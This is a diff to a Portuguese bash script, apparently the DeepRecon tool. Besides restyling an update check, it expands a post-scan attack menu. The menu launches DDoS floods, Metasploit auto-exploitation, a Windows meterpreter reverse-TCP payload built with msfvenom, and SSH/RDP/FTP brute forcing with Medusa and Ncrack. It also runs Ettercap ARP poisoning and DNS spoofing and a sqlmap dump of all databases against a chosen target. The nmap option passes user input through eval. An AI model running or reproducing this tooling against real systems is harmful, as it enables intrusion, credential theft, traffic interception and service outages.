@@ -487,24 +487,57 @@ verificar_versoes() {
 verificar_atualizacao() {
   [ -z "$VERSAO_SCR" ] && VERSAO_SCR="1.0.0"
   [ -z "$URL_GIT" ] && URL_GIT="https://api.github.com/repos/derambrplays/DeepRecon/releases/latest"
-  echo -e "${CYAN}Verificando atualizacoes...${RESET}"
-  VERSAO_GIT=$(curl_rapido "$URL_GIT" 2>/dev/null | grep '"tag_name"' | head -1 | grep -oP 'v?\d+\.\d+\.\d+')
-  [ -z "$VERSAO_GIT" ] && { info "Nao foi possivel verificar atualizacoes (offline?)"; return 0; }
+
+  echo ""
+  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+  echo -e "${CYAN}${BOLD}║        VERIFICANDO ATUALIZACOES...              ║${RESET}"
+  echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
+  echo ""
+
+  local spin=('—' '\' '/' '|') i=0
+  local tmp_out; tmp_out=$(mktemp)
+  (curl_rapido "$URL_GIT" 2>/dev/null | grep '"tag_name"' | head -1 | grep -oP 'v?\d+\.\d+\.\d+' > "$tmp_out") &
+  local pid=$!
+  while kill -0 $pid 2>/dev/null; do
+    printf "\r${CYAN}   %s${RESET} Checando versao remota..." "${spin[i]}"
+    i=$(( (i+1) % 4 ))
+    sleep 0.3
+  done
+  wait $pid 2>/dev/null; printf "\r${GREEN}   \xE2\x9C\x93${RESET} Checando versao remota...\n"
+
+  local VERSAO_GIT
+  VERSAO_GIT=$(cat "$tmp_out" 2>/dev/null); rm -f "$tmp_out"
+
+  [ -z "$VERSAO_GIT" ] && {
+    echo -e "  ${YELLOW}[!] Offline / sem resposta${RESET}"
+    echo -e "  ${BLUE}[i] DeepRecon $VERSAO_SCR (modo local)${RESET}\n"
+    return 0
+  }
+
   if [ "$VERSAO_GIT" != "$VERSAO_SCR" ]; then
-    echo -e "${YELLOW}Nova versao disponivel: $VERSAO_GIT (atual: $VERSAO_SCR)${RESET}"
-    echo -ne "${YELLOW}Atualizar agora? (S/n): ${RESET}"; read -r resp
+    echo ""
+    echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+    echo -e "${YELLOW}${BOLD}║        NOVA VERSAO DISPONIVEL!                  ║${RESET}"
+    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+    echo -e "${YELLOW}${BOLD}║${RESET}  Remota:  ${CYAN}$VERSAO_GIT${RESET}"
+    echo -e "${YELLOW}${BOLD}║${RESET}  Atual:   ${RED}$VERSAO_SCR${RESET}"
+    echo -e "${YELLOW}${BOLD}║${RESET}"
+    echo -e "${YELLOW}${BOLD}║${RESET}  ${YELLOW}Atualizar agora? (S/n)${RESET}"
+    echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
+    echo -ne "  > "; read -r resp
     [[ "$resp" != "n" && "$resp" != "N" ]] && {
+      echo -e "\n${CYAN}[i] Atualizando...${RESET}"
       git pull origin main 2>/dev/null || git pull origin master 2>/dev/null
       local pull_ok=$?
       if [ "$pull_ok" -eq 0 ]; then
-        echo -e "${GREEN}Atualizado! Execute o script novamente.${RESET}"
+        echo -e "${GREEN}[+] Atualizado com sucesso! Execute o script novamente.${RESET}\n"
         exit 0
       else
-        aviso "Falha ao atualizar. Execute: git pull"
+        echo -e "${RED}[!] Falha ao atualizar. Execute: git pull${RESET}\n"
       fi
     }
   else
-    info "DeepRecon $VERSAO_SCR atualizado"
+    echo -e "  ${GREEN}[\xE2\x9C\x93] DeepRecon $VERSAO_SCR atualizado${RESET}\n"
   fi
 }
 
@@ -2257,17 +2290,23 @@ echo ""
 # ===== ATAQUE POS-SCAN =====
 echo ""
 echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
-echo -e "${RED}${BOLD}║         MENU DE ATAQUE - Pos Scan              ║${RESET}"
+echo -e "${RED}${BOLD}║                    MENU DE ATAQUE - Invasao                  ║${RESET}"
 echo -e "${RED}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
 echo -e "${RED}${BOLD}║${RESET}"
-echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[1] DDoS${RESET}     - DDoS-Ripper (Negacao de Servico)"
-echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[2] hping3${RESET}   - DDoS via SYN Flood"
-echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[3] SlowHTTP${RESET} - Slowloris (consume conexoes)"
-echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[4] Bettercap${RESET} - MITM / Sniffing"
-echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[5] Sair${RESET}"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[1]  DDoS${RESET}      - DDoS-Ripper (Negacao de Servico)"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[2]  hping3${RESET}    - DDoS via SYN Flood"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[3]  SlowHTTP${RESET}  - Slowloris (consume conexoes)"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[4]  Bettercap${RESET}  - MITM / Sniffing"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[5]  Metasploit${RESET} - Auto-exploit + suggester"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[6]  Medusa${RESET}     - Brute force multifluxo"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[7]  Ncrack${RESET}     - Brute force RDP/SSH"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[8]  Ettercap${RESET}   - MITM / Sniffing avancado"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[9]  SQLMap${RESET}     - SQL injection direto"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[10] Nmap${RESET}      - Portas / servicos personalizado"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[0]  Sair${RESET}"
 echo -e "${RED}${BOLD}║${RESET}"
 echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
-printf "${YELLOW}Escolha o ataque (1-5): ${RESET}"; read -r ATAQUE_OPT
+printf "${YELLOW}Escolha o ataque (0-10): ${RESET}"; read -r ATAQUE_OPT
 
 ALVO_IP=$(dig +short "$DOMINIO" 2>/dev/null | head -1)
 [ -z "$ALVO_IP" ] && ALVO_IP=$(echo "$IP_ALVO" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
@@ -2346,6 +2385,174 @@ case $ATAQUE_OPT in
     else
       echo -e "\n${RED}[!] bettercap nao disponivel ou IP nao encontrado${RESET}"
     fi ;;
+  5) # Metasploit
+    if command -v msfconsole &>/dev/null; then
+      echo ""
+      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+      echo -e "${RED}║      Metasploit - Exploit Suggester              ║${RESET}"
+      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}1 - Auto-exploit (db_nmap + suggester)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}2 - Console interativa${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}3 - Payload Windows reverse TCP${RESET}"
+      echo -e "${RED}║${RESET}"
+      printf "${YELLOW}Opcao (1-3): ${RESET}"; read -r MSF_OPT
+      case $MSF_OPT in
+        1) echo -e "\n${GREEN}[+] Rodando exploit suggester contra $ALVO_IP...${RESET}\n"
+           if [ -n "$ALVO_IP" ]; then
+             msfconsole -q -x "workspace -a DeepRecon; db_nmap -sV $ALVO_IP; services; vulns; run post/multi/recon/local_exploit_suggester; exit" -y
+           else
+             echo -e "${RED}[!] IP do alvo necessario${RESET}"
+           fi ;;
+        2) echo -e "\n${GREEN}[+] Metasploit interativo. Use 'exit' para voltar.${RESET}\n"
+           msfconsole -q ;;
+        3) echo -e "\n${GREEN}[+] Gerando payload Windows reverse TCP...${RESET}"
+           printf "LHOST: "; read -r LHOST
+           printf "LPORT (4444): "; read -r LPORT
+           [ -z "$LPORT" ] && LPORT=4444
+           msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o ~/payload.exe
+           echo -e "${GREEN}[+] Payload salvo em ~/payload.exe${RESET}" ;;
+      esac
+    else
+      echo -e "\n${RED}[!] msfconsole nao disponivel${RESET}"
+    fi ;;
+  6) # Medusa
+    if command -v medusa &>/dev/null && [ -n "$ALVO_IP" ]; then
+      echo ""
+      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+      echo -e "${RED}║       Medusa - Brute Force Multifluxo            ║${RESET}"
+      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}Servicos: ftp, ssh, http, mysql, smb${RESET}"
+      echo -e "${RED}║${RESET}"
+      printf "Servico alvo (ex: ssh): "; read -r MED_SERV
+      printf "Usuario (ex: root/admin): "; read -r MED_USER
+      echo -e "\n${YELLOW}[!] Testando $MED_SERV em $ALVO_IP como $MED_USER...${RESET}"
+      echo -e "${YELLOW}[!] Use /usr/share/wordlists/ para senhas${RESET}\n"
+      echo -e "${GREEN}[+] medusa -h $ALVO_IP -u $MED_USER -P <wordlist> -M $MED_SERV${RESET}"
+      printf "${YELLOW}Caminho wordlist: ${RESET}"; read -r MED_WL
+      [ -n "$MED_WL" ] && [ -f "$MED_WL" ] && {
+        echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
+        sudo medusa -h "$ALVO_IP" -u "$MED_USER" -P "$MED_WL" -M "$MED_SERV"
+      } || echo -e "${RED}[!] Wordlist invalida${RESET}"
+    else
+      echo -e "\n${RED}[!] medusa nao disponivel ou IP nao encontrado${RESET}"
+    fi ;;
+  7) # Ncrack
+    if command -v ncrack &>/dev/null && [ -n "$ALVO_IP" ]; then
+      echo ""
+      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+      echo -e "${RED}║       Ncrack - Brute Force RDP/SSH              ║${RESET}"
+      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}1 - SSH brute force${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}2 - RDP brute force${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}3 - FTP brute force${RESET}"
+      echo -e "${RED}║${RESET}"
+      printf "Opcao (1-3): "; read -r NC_OPT
+      local NC_PORT=""; local NC_SVC=""
+      case $NC_OPT in
+        1) NC_PORT=22; NC_SVC="ssh" ;;
+        2) NC_PORT=3389; NC_SVC="rdp" ;;
+        3) NC_PORT=21; NC_SVC="ftp" ;;
+      esac
+      if [ -n "$NC_PORT" ]; then
+        echo -e "\n${YELLOW}[!] Ataque $NC_SVC em $ALVO_IP:$NC_PORT${RESET}"
+        printf "Usuario (ex: administrator): "; read -r NC_USER
+        echo -e "${GREEN}[+] ncrack -v -U <users> -P <pass> $ALVO_IP:$NC_PORT${RESET}"
+        printf "${YELLOW}Caminho wordlist senhas: ${RESET}"; read -r NC_WL
+        [ -n "$NC_WL" ] && [ -f "$NC_WL" ] && {
+          echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
+          sudo ncrack -v -U <(echo "$NC_USER") -P "$NC_WL" "$ALVO_IP:$NC_PORT"
+        } || echo -e "${RED}[!] Wordlist invalida${RESET}"
+      else
+        echo -e "\n${RED}[!] Opcao invalida${RESET}"
+      fi
+    else
+      echo -e "\n${RED}[!] ncrack nao disponivel ou IP nao encontrado${RESET}"
+    fi ;;
+  8) # Ettercap
+    if command -v ettercap &>/dev/null && [ -n "$ALVO_IP" ]; then
+      echo ""
+      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+      echo -e "${RED}║       Ettercap - MITM Avancado                   ║${RESET}"
+      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}1 - ARP poison + snif (texto)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}2 - ARP poison + snif (GUI)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}3 - DNS spoof${RESET}"
+      echo -e "${RED}║${RESET}"
+      printf "Opcao (1-3): "; read -r ET_OPT
+      case $ET_OPT in
+        1) echo -e "\n${GREEN}[+] Ettercap em modo texto contra $ALVO_IP...${RESET}\n"
+           sudo ettercap -T -M arp:remote /"$ALVO_IP"// ;;
+        2) echo -e "\n${GREEN}[+] Ettercap em modo GUI...${RESET}\n"
+           sudo ettercap -G ;;
+        3) echo -e "\n${GREEN}[+] DNS spoofing...${RESET}"
+           echo -e "${YELLOW}[!] Configure /etc/ettercap/etter.dns primeiro${RESET}\n"
+           sudo ettercap -T -M arp:remote /"$ALVO_IP"// -P dns_spoof ;;
+      esac
+    else
+      echo -e "\n${RED}[!] ettercap nao disponivel ou IP nao encontrado${RESET}"
+    fi ;;
+  9) # SQLMap
+    if command -v sqlmap &>/dev/null && [ -n "$ALVO" ]; then
+      echo ""
+      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+      echo -e "${RED}║       SQLMap - SQL Injection Direto              ║${RESET}"
+      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}1 - Scan rapido (--batch)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}2 - Dump tudo (agressivo)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}3 - Modo expert (personalizado)${RESET}"
+      echo -e "${RED}║${RESET}"
+      printf "Opcao (1-3): "; read -r SQL_OPT
+      echo ""
+      case $SQL_OPT in
+        1) echo -e "${YELLOW}[!] SQLMap scan rapido em $ALVO${RESET}\n"
+           sqlmap -u "$ALVO" --batch --random-agent --level 2 --risk 2 2>/dev/null | head -30
+           echo -e "\n${GREEN}[+] Relatorio salvo em ~/.local/share/sqlmap/output/${RESET}" ;;
+        2) echo -e "${RED}[!] SQLMap DUMP - Pode consumir recursos!${RESET}"
+           printf "${RED}Confirmar dump de todos os DBs? (s/N): ${RESET}"; read -r CONFIRMA
+           [ "$CONFIRMA" = "s" ] || [ "$CONFIRMA" = "S" ] && {
+             echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
+             sqlmap -u "$ALVO" --batch --random-agent --threads 5 --dump-all 2>/dev/null | head -50
+           } ;;
+        3) echo -e "${CYAN}[i] SQLMap modo expert: digite parametros extras${RESET}"
+           echo -e "${CYAN}    Ex: --data 'user=1' --cookie 'PHPSESSID=x' --level 5${RESET}"
+           printf "Parametros extras: "; read -r SQL_EXTRA
+           echo -e "\n${RED}[!] CTRL+C para parar${RESET}\n"
+           sqlmap -u "$ALVO" --batch --random-agent $SQL_EXTRA 2>/dev/null | head -50 ;;
+      esac
+    else
+      echo -e "\n${RED}[!] sqlmap nao disponivel ou URL invalida${RESET}"
+    fi ;;
+  10) # Nmap
+    if command -v nmap &>/dev/null && [ -n "$ALVO_IP" ]; then
+      echo ""
+      echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+      echo -e "${RED}║       Nmap - Scan Personalizado                  ║${RESET}"
+      echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}1 - Scan rapido (top 100 portas)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}2 - Scan completo (todas portas)${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}3 - Scan servicos + OS detect${RESET}"
+      echo -e "${RED}║${RESET}  ${CYAN}4 - Comando personalizado${RESET}"
+      echo -e "${RED}║${RESET}"
+      printf "Opcao (1-4): "; read -r NM_OPT
+      echo ""
+      case $NM_OPT in
+        1) echo -e "${GREEN}[+] nmap -T4 --top-ports 100 $ALVO_IP${RESET}\n"
+           sudo nmap -T4 --top-ports 100 "$ALVO_IP" 2>/dev/null ;;
+        2) echo -e "${YELLOW}[!] Scan completo em $ALVO_IP (pode demorar)${RESET}\n"
+           sudo nmap -T4 -p- "$ALVO_IP" 2>/dev/null ;;
+        3) echo -e "${GREEN}[+] nmap -sV -O --traceroute $ALVO_IP${RESET}\n"
+           sudo nmap -sV -O --traceroute "$ALVO_IP" 2>/dev/null ;;
+        4) printf "${YELLOW}Digite o comando nmap: ${RESET}"; read -r NM_CMD
+           [ -n "$NM_CMD" ] && {
+             echo -e "\n${GREEN}[+] nmap $NM_CMD $ALVO_IP${RESET}\n"
+             eval "sudo nmap $NM_CMD \"$ALVO_IP\"" 2>/dev/null
+           } || echo -e "${RED}[!] Comando vazio${RESET}" ;;
+      esac
+    else
+      echo -e "\n${RED}[!] nmap nao disponivel ou IP nao encontrado${RESET}"
+    fi ;;
+  *|0)
+    echo -e "\n${BLUE}[i] Saindo do menu de ataque...${RESET}" ;;
 esac
 echo ""
 
